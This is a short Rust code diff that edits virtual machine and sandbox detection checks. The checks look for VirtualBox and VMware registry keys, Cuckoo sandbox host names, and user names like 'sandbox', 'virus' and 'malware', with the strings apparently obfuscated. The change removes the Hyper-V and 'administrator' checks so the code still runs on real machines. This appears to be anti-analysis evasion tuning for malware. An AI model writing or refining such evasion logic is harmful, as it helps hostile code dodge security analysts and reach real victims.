@@ -177,12 +177,12 @@ fn check_no_vm_registry() -> bool {
     let hklm = api::HKEY_LOCAL_MACHINE;
     let hkcu = api::HKEY_CURRENT_USER;
 
+    // Note: Hyper-V key excluded — present on many physical Windows 11 machines
     let vm_keys: &[(*mut u8, fn() -> String)] = &[
         (hklm, s_det_reg_vbox_key as fn() -> String),
         (hklm, s_det_reg_vmware_key),
         (hklm, s_det_reg_vbox_additions),
         (hklm, s_det_reg_vbox_acpi),
-        (hklm, s_det_reg_hyperv_key),
     ];
 
     for (hive, key_fn) in vm_keys {
@@ -270,8 +270,9 @@ fn check_host_user_names() -> bool {
         s_det_host_cuckoo(), s_det_host_analy(), s_det_host_win7(),
         s_det_host_win10(),
     ];
+    // Note: "administrator" excluded — legitimate RDP sessions often use this account
     let suspicious_users = [
-        s_det_user_admin(), s_det_user_user(), s_det_user_test(),
+        s_det_user_user(), s_det_user_test(),
         s_det_sandbox(), s_det_virus(), s_det_malware(),
     ];
 
